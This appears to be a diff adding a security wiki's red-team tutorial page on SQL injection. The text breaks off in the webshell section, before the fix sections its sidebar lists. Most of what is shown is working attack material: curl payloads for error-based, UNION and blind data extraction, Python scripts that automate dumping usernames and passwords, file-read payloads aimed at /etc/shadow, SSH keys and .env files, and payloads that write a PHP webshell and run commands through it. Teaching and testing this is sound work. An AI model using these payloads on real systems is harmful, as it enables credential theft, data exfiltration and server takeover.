@@ -1,0 +1,1339 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>SQL Injection | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="SQL Injection">
+		<meta name="keywords" content="blind-sqli, database, nosql-injection, redteam, sql-injection, sqli, sqlmap">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="SQL Injection">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Exploiting unsanitized user input in SQL queries to bypass authentication, extract data, read filesystem files, and achieve remote code execution.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/sql-injection.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="SQL Injection">
+		<meta name="twitter:description" itemprop="description" content="Exploiting unsanitized user input in SQL queries to bypass authentication, extract data, read filesystem files, and achieve remote code execution.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-problem">The Problem</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#manual-detection-single-quote-method">Manual Detection: Single-Quote Method</a></b>
+					<ul>
+						<li><a href="#double-quote-test">Double Quote Test</a></li>
+						<li><a href="#backslash-escaping-test">Backslash Escaping Test</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#error-based-extraction">Error-Based Extraction</a></b>
+					<ul>
+						<li><a href="#postgresql-error-based-extraction">PostgreSQL error-based extraction</a></li>
+						<li><a href="#mssql-error-based-extraction">MSSQL error-based extraction</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#union-based-injection">UNION-Based Injection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#database-enumeration-reference">Database Enumeration Reference</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#blind-sql-injection-boolean-based">Blind SQL Injection: Boolean-Based</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#blind-sql-injection-time-based">Blind SQL Injection: Time-Based</a></b>
+					<ul>
+						<li><a href="#automated-time-based-extraction-script">Automated time-based extraction script</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#reading-files-from-the-database-server">Reading Files from the Database Server</a></b>
+					<ul>
+						<li><a href="#common-targets-for-file-read">Common targets for file read</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#writing-files-webshell-deployment">Writing Files (Webshell Deployment)</a></b>
+					<ul>
+						<li><a href="#webshell-alternatives">Webshell Alternatives</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#out-of-band-sqli">Out-of-Band SQLi</a></b>
+					<ul>
+						<li><a href="#oob-via-http-requests-from-the-database">OOB via HTTP requests from the database</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#second-order-sql-injection">Second-Order SQL Injection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#nosql-injection-mongodb">NoSQL Injection (MongoDB)</a></b>
+					<ul>
+						<li><a href="#automated-nosql-injection-extraction">Automated NoSQL injection extraction</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#sqlmap-automated-exploitation">SQLmap: Automated Exploitation</a></b>
+					<ul>
+						<li><a href="#key-tamper-scripts-and-what-they-do">Key tamper scripts and what they do</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#prepared-statements-how-the-fix-works">Prepared Statements: How the Fix Works</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#manual-exploitation-walkthrough">Manual Exploitation Walkthrough</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/sql-injection.html">Sql Injection</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="sql-injection">SQL Injection</h2>
+					<p>
+						Exploiting unsanitized user input in
+						<abbr title="Structured Query Language">SQL</abbr>
+						queries to bypass authentication,
+						extract data, read filesystem files, and achieve remote code execution.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							<abbr title="Structured Query Language">SQL</abbr>
+							injection tricks a database into treating user input as query
+							code instead of data. This article shows how to confirm the flaw with a single quote, exploit
+							it with error-based and
+							<code>UNION</code>
+							payloads, and extract data through boolean and time-based blind
+							channels. It then covers file read and write,
+							<abbr title="Not Only SQL">NoSQL</abbr>
+							injection, second-order
+							injection, sqlmap, and the prepared statements that close the hole. By the end you can run a
+							full injection test and explain why parameterized queries stop it.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">HTTP</a> - request/response structure, query parameters, POST bodies, headers</li>
+							<li><a href="/wiki/articles/fundamentals/authentication.html">Authentication</a> - <abbr title="Structured Query Language">SQL</abbr> backed authentication patterns, session management</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-problem">The Problem</h3>
+						<p>
+							<abbr title="Structured Query Language">SQL</abbr>
+							injection exists wherever user-controlled input is concatenated
+							into a
+							<abbr title="Structured Query Language">SQL</abbr>
+							query string. The database cannot distinguish between
+							<em>code</em>
+							(the query structure) and
+							<em>data</em>
+							(the user's input). When a developer writes:
+						</p>
+						<pre class="python">
+# VULNERABLE: string concatenation
+username = request.form[&#39;username&#39;]
+password = request.form[&#39;password&#39;]
+query = f&#34;SELECT * FROM users WHERE username=&#39;{username}&#39; AND password=&#39;{password}&#39;&#34;
+cursor.execute(query)
+						</pre>
+						<p>
+							The attacker supplies
+							<code>&#39; OR 1=1 --</code>
+							as the username, and the executed query becomes:
+						</p>
+						<pre class="sql">
+SELECT * FROM users WHERE username=&#39;&#39; OR 1=1 --&#39; AND password=&#39;whatever&#39;
+						</pre>
+						<p>
+							The
+							<code>--</code>
+							comments out the rest.
+							<code>OR 1=1</code>
+							is always true. The query returns all users. This is
+							the simplest form but the principle scales to any injection point:
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							parameters, POST bodies, cookies,
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							headers,
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							fields in
+							<abbr title="Not Only SQL">NoSQL</abbr>
+							stores - anywhere data flows into a query interpreter.
+						</p>
+					</section>
+					<section>
+						<h3 id="manual-detection-single-quote-method">Manual Detection: Single-Quote Method</h3>
+						<p>
+							The first probe is always a single quote - it breaks the query syntax, and the error message
+							tells you what database and sometimes the query structure.
+						</p>
+						<pre class="bash">
+# Test parameter &#39;id&#39; for SQLi
+curl -s &#39;https://target.example.com/product?id=1&#39;
+curl -s &#39;https://target.example.com/product?id=1&#39;&#39;
+
+# Responses to interpret:
+# &#34;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version&#34;
+#   → MySQL, injection confirmed
+# &#34;Unclosed quotation mark after the character string&#34;
+#   → MSSQL
+# &#34;ERROR: unterminated quoted string at or near&#34;
+#   → PostgreSQL
+# &#34;near \&#34;1&#39;&#39;\&#34;: syntax error&#34;
+#   → SQLite
+
+# If the application suppresses errors, test the second probe — boolean logic
+curl -s &#39;https://target.example.com/product?id=1&#39;
+curl -s &#39;https://target.example.com/product?id=1 AND 1=1&#39;   # Should return same as id=1
+curl -s &#39;https://target.example.com/product?id=1 AND 1=2&#39;   # Should return nothing/different
+						</pre>
+						<p>
+							If
+							<code>AND 1=1</code>
+							returns the same result but
+							<code>AND 1=2</code>
+							returns nothing or a different page, the
+							injection is boolean-based. The database is evaluating your injected condition.
+						</p>
+						<h4 id="double-quote-test">Double Quote Test</h4>
+						<pre class="bash">
+# Some queries use double quotes: SELECT * FROM users WHERE username=&#34;admin&#34;
+curl -s &#39;https://target.example.com/search?q=admin&#34;&#39;
+curl -s &#39;https://target.example.com/search?q=admin&#34; OR &#34;1&#34;=&#34;1&#39;
+curl -s &#39;https://target.example.com/search?q=admin&#34; OR &#34;1&#34;=&#34;2&#39;
+						</pre>
+						<h4 id="backslash-escaping-test">Backslash Escaping Test</h4>
+						<pre class="bash">
+# MySQL interprets \&#39; as an escaped quote; PostgreSQL does not (uses &#39;&#39; for escaping)
+curl -s &#39;https://target.example.com/search?q=admin\&#39;&#39;
+# MySQL: may not error (backslash escapes the quote)
+# PostgreSQL: will error on the lone quote
+						</pre>
+					</section>
+					<section>
+						<h3 id="error-based-extraction">Error-Based Extraction</h3>
+						<p>
+							When the database returns error messages, extract data through them. This works by intentionally
+							causing type conversion errors that embed data in the error string.
+						</p>
+						<pre class="bash">
+# MySQL: Extract database version via error
+curl -s &#39;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,VERSION()))&#39;
+# Error: XPATH syntax error: &#39;:8.0.36&#39; — version = 8.0.36
+
+# MySQL: Extract current database user
+curl -s &#39;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,USER()))&#39;
+# Error: XPATH syntax error: &#39;:root@localhost&#39;
+
+# MySQL: Extract table names one by one
+# Extract first table from current database
+curl -s &#34;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))&#34;
+# To get next: LIMIT 1,1  LIMIT 2,2  LIMIT 3,3 ...
+
+# MySQL: Extract column names from a known table
+curl -s &#34;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; LIMIT 0,1)))&#34;
+
+# MySQL: Extract actual data (subject to EXTRACTVALUE 32-char limit — use SUBSTRING)
+curl -s &#34;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT CONCAT(username,&#39;:&#39;,password) FROM users LIMIT 0,1)))&#34;
+
+# MySQL: Bypass 32-char EXTRACTVALUE limit with SUBSTRING
+curl -s &#34;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,SUBSTRING((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users),1,32)))&#34;
+curl -s &#34;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,SUBSTRING((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users),33,64)))&#34;
+						</pre>
+						<h4 id="postgresql-error-based-extraction">PostgreSQL error-based extraction</h4>
+						<pre class="bash">
+# PostgreSQL version
+curl -s &#34;https://target.example.com/product?id=1 AND cast(version() as numeric)&#34;
+
+# PostgreSQL current database
+curl -s &#34;https://target.example.com/product?id=1 AND cast(current_database() as numeric)&#34;
+
+# PostgreSQL extract table names
+curl -s &#34;https://target.example.com/product?id=1 AND cast((SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;public&#39; LIMIT 1 OFFSET 0) as numeric)&#34;
+						</pre>
+						<h4 id="mssql-error-based-extraction">MSSQL error-based extraction</h4>
+						<pre class="bash">
+# MSSQL version
+curl -s &#34;https://target.example.com/product?id=1 AND 1=CONVERT(int, @@version)&#34;
+
+# MSSQL database name
+curl -s &#34;https://target.example.com/product?id=1 AND 1=CONVERT(int, DB_NAME())&#34;
+
+# MSSQL current user
+curl -s &#34;https://target.example.com/product?id=1 AND 1=CONVERT(int, SYSTEM_USER)&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="union-based-injection">UNION-Based Injection</h3>
+						<p>
+							UNION injection appends attacker-controlled result sets to legitimate queries. Requirements:
+							the original query must return data to the page; you must match the column count; you must find
+							visible output columns.
+						</p>
+						<pre class="bash">
+# Step 1: Determine column count via ORDER BY
+curl -s &#39;https://target.example.com/product?id=1 ORDER BY 1&#39;   # works
+curl -s &#39;https://target.example.com/product?id=1 ORDER BY 2&#39;   # works
+curl -s &#39;https://target.example.com/product?id=1 ORDER BY 3&#39;   # works
+curl -s &#39;https://target.example.com/product?id=1 ORDER BY 4&#39;   # error → 3 columns
+
+# Step 2: Determine column count via NULL padding (works on all DBMS)
+curl -s &#39;https://target.example.com/product?id=1 UNION SELECT NULL--&#39;
+curl -s &#39;https://target.example.com/product?id=1 UNION SELECT NULL,NULL--&#39;
+curl -s &#39;https://target.example.com/product?id=1 UNION SELECT NULL,NULL,NULL--&#39;
+# When the error stops: that&#39;s the column count
+
+# Step 3: Find which columns appear in the output
+curl -s &#34;https://target.example.com/product?id=1 UNION SELECT &#39;col1&#39;,&#39;col2&#39;,&#39;col3&#39;--&#34;
+# Look for &#39;col1&#39;, &#39;col2&#39;, &#39;col3&#39; in the response — those columns are visible
+
+# Step 4: Extract data through visible columns
+# Replace visible column positions with data-extraction queries
+curl -s &#34;https://target.example.com/product?id=1 UNION SELECT 1,@@version,3--&#34;         # MySQL
+curl -s &#34;https://target.example.com/product?id=1 UNION SELECT 1,version(),3--&#34;          # PostgreSQL
+curl -s &#34;https://target.example.com/product?id=1 UNION SELECT 1,sqlite_version(),3--&#34;   # SQLite
+curl -s &#34;https://target.example.com/product?id=1 UNION SELECT 1,@@version,3--&#34;           # MSSQL
+
+# MySQL: Dump all table names
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--&#34;
+
+# MySQL: Dump all columns from a specific table
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=&#39;users&#39;--&#34;
+
+# MySQL: Dump usernames and passwords
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(username,&#39;:&#39;,password),3 FROM users--&#34;
+
+# PostgreSQL: Dump table names
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,string_agg(table_name,&#39;,&#39;),3 FROM information_schema.tables WHERE table_schema=&#39;public&#39;--&#34;
+
+# SQLite: Dump table names
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type=&#39;table&#39;--&#34;
+						</pre>
+						<p>
+							<b>Note:</b>
+							Use
+							<code>id=-1</code>
+							(a non-existent ID) so the original query returns zero rows and only your
+							UNION data appears. This prevents the legitimate result from obscuring your extracted data.
+						</p>
+					</section>
+					<section>
+						<h3 id="database-enumeration-reference">Database Enumeration Reference</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Operation</th>
+									<th align="center">MySQL</th>
+									<th align="center">PostgreSQL</th>
+									<th align="center">MSSQL</th>
+									<th align="center">SQLite</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Version</td>
+									<td align="center"><code>@@version</code>,<code>VERSION()</code></td>
+									<td align="center"><code>version()</code></td>
+									<td align="center"><code>@@version</code></td>
+									<td align="center"><code>sqlite_version()</code></td>
+								</tr>
+								<tr>
+									<td align="center">Current DB</td>
+									<td align="center"><code>DATABASE()</code></td>
+									<td align="center"><code>current_database()</code></td>
+									<td align="center"><code>DB_NAME()</code></td>
+									<td align="center">N/A (single file)</td>
+								</tr>
+								<tr>
+									<td align="center">Current user</td>
+									<td align="center"><code>USER()</code>,<code>CURRENT_USER()</code></td>
+									<td align="center"><code>current_user</code>,<code>user</code></td>
+									<td align="center"><code>SYSTEM_USER</code></td>
+									<td align="center">N/A</td>
+								</tr>
+								<tr>
+									<td align="center">List tables</td>
+									<td align="center"><code>information_schema.tables</code></td>
+									<td align="center"><code>information_schema.tables</code></td>
+									<td align="center"><code>information_schema.tables</code></td>
+									<td align="center"><code>sqlite_master</code></td>
+								</tr>
+								<tr>
+									<td align="center">List columns</td>
+									<td align="center"><code>information_schema.columns</code></td>
+									<td align="center"><code>information_schema.columns</code></td>
+									<td align="center"><code>information_schema.columns</code></td>
+									<td align="center"><code>PRAGMA table_info(tbl)</code></td>
+								</tr>
+								<tr>
+									<td align="center">String concat</td>
+									<td align="center"><code>CONCAT(a,b)</code>,<code>GROUP_CONCAT(c)</code></td>
+									<td align="center"><code>a \|\| b</code>,<code>STRING_AGG(c,&#39;,&#39;)</code></td>
+									<td align="center"><code>a + b</code></td>
+									<td align="center"><code>a \|\| b</code>,<code>GROUP_CONCAT(c)</code></td>
+								</tr>
+								<tr>
+									<td align="center">Row limit</td>
+									<td align="center"><code>LIMIT offset,count</code></td>
+									<td align="center"><code>LIMIT count OFFSET n</code></td>
+									<td align="center"><code>TOP</code>,<code>OFFSET...FETCH</code></td>
+									<td align="center"><code>LIMIT count OFFSET n</code></td>
+								</tr>
+								<tr>
+									<td align="center">Comment</td>
+									<td align="center"><code>--</code>,<code>#</code>,<code>/* */</code></td>
+									<td align="center"><code>--</code>,<code>/* */</code></td>
+									<td align="center"><code>--</code>,<code>/* */</code></td>
+									<td align="center"><code>--</code>,<code>/* */</code></td>
+								</tr>
+								<tr>
+									<td align="center">Subselect in SELECT</td>
+									<td align="center">Allowed</td>
+									<td align="center">Allowed</td>
+									<td align="center">Allowed</td>
+									<td align="center">Allowed</td>
+								</tr>
+								<tr>
+									<td align="center">String delimiter</td>
+									<td align="center"><code>&#39;</code>or<code>&#34;</code>(modes vary)</td>
+									<td align="center"><code>&#39;</code></td>
+									<td align="center"><code>&#39;</code></td>
+									<td align="center"><code>&#39;</code></td>
+								</tr>
+								<tr>
+									<td align="center">Read file</td>
+									<td align="center"><code>LOAD_FILE(&#39;/path&#39;)</code></td>
+									<td align="center"><code>pg_read_file(&#39;/path&#39;)</code></td>
+									<td align="center"><code>OPENROWSET(BULK ...)</code></td>
+									<td align="center"><code>readfile(&#39;/path&#39;)</code></td>
+								</tr>
+								<tr>
+									<td align="center">Write file</td>
+									<td align="center"><code>INTO OUTFILE &#39;/path&#39;</code></td>
+									<td align="center"><code>COPY ... TO &#39;/path&#39;</code></td>
+									<td align="center"><code>xp_cmdshell</code></td>
+									<td align="center"><code>writefile(&#39;/path&#39;,data)</code></td>
+								</tr>
+								<tr>
+									<td align="center">Stacked queries</td>
+									<td align="center">Usually (depends on driver)</td>
+									<td align="center">Usually</td>
+									<td align="center">Usually</td>
+									<td align="center">Only via C API</td>
+								</tr>
+								<tr>
+									<td align="center">Sleep</td>
+									<td align="center"><code>SLEEP(n)</code></td>
+									<td align="center"><code>pg_sleep(n)</code></td>
+									<td align="center"><code>WAITFOR DELAY &#39;0:0:n&#39;</code></td>
+									<td align="center"><code>randomblob(100000000)</code></td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="blind-sql-injection-boolean-based">Blind SQL Injection: Boolean-Based</h3>
+						<p>
+							When no errors and no data output appear, blind
+							<abbr title="SQL Injection">SQLi</abbr>
+							extracts data one bit
+							at a time through boolean questions. If the page behaves differently for TRUE vs FALSE conditions,
+							you can ask any yes/no question of the database.
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+Boolean-based blind SQLi extraction.
+Page returns one response for TRUE conditions, another for FALSE.
+&#34;&#34;&#34;
+import requests
+import string
+
+TARGET = &#34;https://target.example.com/product&#34;
+PARAM = &#34;id&#34;
+TRUE_SIZE = 1546   # Response size when condition is TRUE
+CHARSET = string.ascii_letters + string.digits + &#34;_-@.:/&#34;
+
+def inject_condition(condition: str) -&gt; bool:
+    &#34;&#34;&#34;Execute a boolean condition and return True/False.&#34;&#34;&#34;
+    payload = f&#34;1 AND ({condition})&#34;
+    resp = requests.get(TARGET, params={PARAM: payload})
+    return len(resp.content) == TRUE_SIZE
+
+def extract_length(query: str) -&gt; int:
+    &#34;&#34;&#34;Determine the length of a subquery result.&#34;&#34;&#34;
+    for length in range(1, 256):
+        if inject_condition(f&#34;LENGTH(({query}))={length}&#34;):
+            return length
+    return 0
+
+def extract_string(query: str) -&gt; str:
+    &#34;&#34;&#34;Extract a string character by character using binary search on ASCII.&#34;&#34;&#34;
+    length = extract_length(query)
+    result = &#34;&#34;
+    for position in range(1, length + 1):
+        # Binary search over ASCII range
+        low, high = 32, 126
+        while low &lt;= high:
+            mid = (low + high) // 2
+            if inject_condition(f&#34;ASCII(SUBSTRING(({query}),{position},1))&lt;={mid}&#34;):
+                high = mid - 1
+            else:
+                low = mid + 1
+        result += chr(low)
+        print(f&#34;\r[*] Extracting: {result}&#34;, end=&#34;&#34;, flush=True)
+    print()
+    return result
+
+# Extract database name
+db_name = extract_string(&#34;SELECT DATABASE()&#34;)
+print(f&#34;[+] Database: {db_name}&#34;)
+
+# Extract table names (first table)
+table_name = extract_string(
+    &#34;SELECT table_name FROM information_schema.tables &#34;
+    &#34;WHERE table_schema=database() LIMIT 0,1&#34;
+)
+print(f&#34;[+] First table: {table_name}&#34;)
+
+# Extract column names
+column_name = extract_string(
+    &#34;SELECT column_name FROM information_schema.columns &#34;
+    f&#34;WHERE table_name=&#39;{table_name}&#39; LIMIT 0,1&#34;
+)
+print(f&#34;[+] First column: {column_name}&#34;)
+
+# Extract data
+users = extract_string(
+    f&#34;SELECT GROUP_CONCAT({column_name}) FROM {table_name}&#34;
+)
+print(f&#34;[+] Data: {users}&#34;)
+						</pre>
+					</section>
+					<section>
+						<h3 id="blind-sql-injection-time-based">Blind SQL Injection: Time-Based</h3>
+						<p>
+							When there are zero observable differences in response content (same page regardless of TRUE/FALSE),
+							use time delays. The database pauses when your condition is TRUE.
+						</p>
+						<pre class="bash">
+# MySQL: time-based detection
+curl -s -w &#34;\nTime: %{time_total}s\n&#34; \
+  &#39;https://target.example.com/product?id=1 AND SLEEP(5)&#39;
+# If time_total &gt; 5 seconds, injection confirmed
+
+# MySQL: time-based data extraction (ask yes/no questions)
+# Is the first character of database() &gt; &#39;m&#39;?
+curl -s -w &#34;\nTime: %{time_total}s\n&#34; \
+  &#34;https://target.example.com/product?id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))&gt;109,SLEEP(3),0)&#34;
+
+# PostgreSQL: pg_sleep
+curl -s -w &#34;\nTime: %{time_total}s\n&#34; \
+  &#34;https://target.example.com/product?id=1; SELECT CASE WHEN (SELECT LENGTH(current_database()))&gt;3 THEN pg_sleep(5) ELSE pg_sleep(0) END--&#34;
+
+# MSSQL: WAITFOR DELAY
+curl -s -w &#34;\nTime: %{time_total}s\n&#34; \
+  &#34;https://target.example.com/product?id=1; IF (SELECT COUNT(*) FROM information_schema.tables)&gt;0 WAITFOR DELAY &#39;0:0:5&#39;--&#34;
+
+# SQLite: heavy computation as time delay
+curl -s -w &#34;\nTime: %{time_total}s\n&#34; \
+  &#34;https://target.example.com/product?id=1 AND (SELECT CASE WHEN (SELECT LENGTH(sqlite_version()))&gt;3 THEN randomblob(100000000) ELSE 0 END)&#34;
+						</pre>
+						<h4 id="automated-time-based-extraction-script">Automated time-based extraction script</h4>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+Time-based blind SQLi — extracts data via SLEEP/WAITFOR.
+Slower than boolean-based but works without any response difference.
+&#34;&#34;&#34;
+import requests
+import time
+import string
+
+TARGET = &#34;https://target.example.com/product&#34;
+PARAM = &#34;id&#34;
+BASE_TIME = 0.2   # Average response time for normal requests
+DELAY = 3          # Sleep duration for TRUE conditions
+CHARSET = string.ascii_lowercase + string.digits + &#34;_-@&#34;
+
+def benchmark_baseline():
+    &#34;&#34;&#34;Measure normal response time.&#34;&#34;&#34;
+    times = []
+    for _ in range(10):
+        start = time.monotonic()
+        requests.get(TARGET, params={PARAM: &#34;1&#34;})
+        times.append(time.monotonic() - start)
+    return sum(times) / len(times)
+
+BASELINE = benchmark_baseline()
+THRESHOLD = BASELINE + (DELAY / 2)
+
+def time_condition(condition: str) -&gt; bool:
+    &#34;&#34;&#34;Execute a condition with SLEEP; return True if delayed.&#34;&#34;&#34;
+    query = f&#34;1 AND IF(({condition}),SLEEP({DELAY}),0)&#34;
+    start = time.monotonic()
+    try:
+        requests.get(TARGET, params={PARAM: query}, timeout=DELAY + 5)
+    except requests.exceptions.Timeout:
+        pass
+    elapsed = time.monotonic() - start
+    return elapsed &gt;= THRESHOLD
+
+def extract_length(query: str) -&gt; int:
+    &#34;&#34;&#34;Determine result length via time-based boolean.&#34;&#34;&#34;
+    for length in range(1, 128):
+        if time_condition(f&#34;LENGTH(({query}))={length}&#34;):
+            return length
+    return 0
+
+def extract_string(query: str) -&gt; str:
+    &#34;&#34;&#34;Extract string by time-based ASCII binary search.&#34;&#34;&#34;
+    result_length = extract_length(query)
+    result = &#34;&#34;
+    for pos in range(1, result_length + 1):
+        low, high = 32, 126
+        while low &lt;= high:
+            mid = (low + high) // 2
+            if time_condition(f&#34;ASCII(SUBSTRING(({query}),{pos},1))&lt;={mid}&#34;):
+                high = mid - 1
+            else:
+                low = mid + 1
+        result += chr(low)
+        print(f&#34;\r[*] {result}&#34;, end=&#34;&#34;, flush=True)
+    print()
+    return result
+
+print(f&#34;[*] Baseline response time: {BASELINE:.3f}s, threshold: {THRESHOLD:.3f}s&#34;)
+db_user = extract_string(&#34;SELECT USER()&#34;)
+print(f&#34;[+] Current user: {db_user}&#34;)
+						</pre>
+					</section>
+					<section>
+						<h3 id="reading-files-from-the-database-server">Reading Files from the Database Server</h3>
+						<p>If the database user has FILE privileges, read arbitrary files from the server's filesystem.</p>
+						<pre class="bash">
+# MySQL: LOAD_FILE() — requires FILE privilege, file must be readable by mysql user
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,LOAD_FILE(&#39;/etc/passwd&#39;),3--&#34;
+
+# PostgreSQL: pg_read_file() — requires superuser or pg_read_server_files role
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,pg_read_file(&#39;/etc/passwd&#39;,0,1000000),3--&#34;
+
+# PostgreSQL: Read arbitrary file via COPY (requires superuser)
+curl -s &#34;https://target.example.com/product?id=1; CREATE TEMP TABLE file_read (line text); COPY file_read FROM &#39;/etc/passwd&#39;; SELECT * FROM file_read;--&#34;
+
+# MSSQL: Read file via OPENROWSET
+curl -s &#34;https://target.example.com/product?id=1; SELECT * FROM OPENROWSET(BULK &#39;C:\Windows\System32\drivers\etc\hosts&#39;, SINGLE_CLOB) AS file_contents--&#34;
+						</pre>
+						<h4 id="common-targets-for-file-read">Common targets for file read</h4>
+						<pre class="plaintext">
+/etc/passwd                       # User enumeration
+/etc/shadow                       # Password hashes (requires root)
+/var/www/html/config.php          # Database credentials
+/var/www/.env                     # Environment variables, secrets
+/home/user/.ssh/id_rsa            # SSH private keys
+/proc/self/environ                # Process environment variables
+/var/log/apache2/access.log       # Access logs (for log poisoning)
+C:\Windows\System32\drivers\etc\hosts  # Windows hosts file
+C:\inetpub\wwwroot\web.config     # IIS configuration
+						</pre>
+					</section>
+					<section>
+						<h3 id="writing-files-webshell-deployment">Writing Files (Webshell Deployment)</h3>
+						<pre class="bash">
+# MySQL: INTO OUTFILE — writes query result to file
+# Requires FILE privilege, file must not exist, directory must be writable
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,&#39;&lt;?php system($_GET[\&#34;cmd\&#34;]); ?&gt;&#39;,3 INTO OUTFILE &#39;/var/www/html/shell.php&#39;--&#34;
+
+# MySQL: INTO DUMPFILE — single-row binary output (no newlines/formatting)
+curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT &#39;&lt;?php system($_GET[\&#34;cmd\&#34;]); ?&gt;&#39; INTO DUMPFILE &#39;/var/www/html/cmd.php&#39;--&#34;
+
+# PostgreSQL: COPY TO
+curl -s &#34;https://target.example.com/product?id=1; COPY (SELECT &#39;&lt;?php system($_GET[\&#34;cmd\&#34;]); ?&gt;&#39;) TO &#39;/var/www/html/shell.php&#39;;--&#34;
+
+# Access the uploaded shell
+curl -s &#39;https://target.example.com/shell.php?cmd=id&#39;
+curl -s &#39;https://target.example.com/shell.php?cmd=cat%20/etc/passwd&#39;
+						</pre>
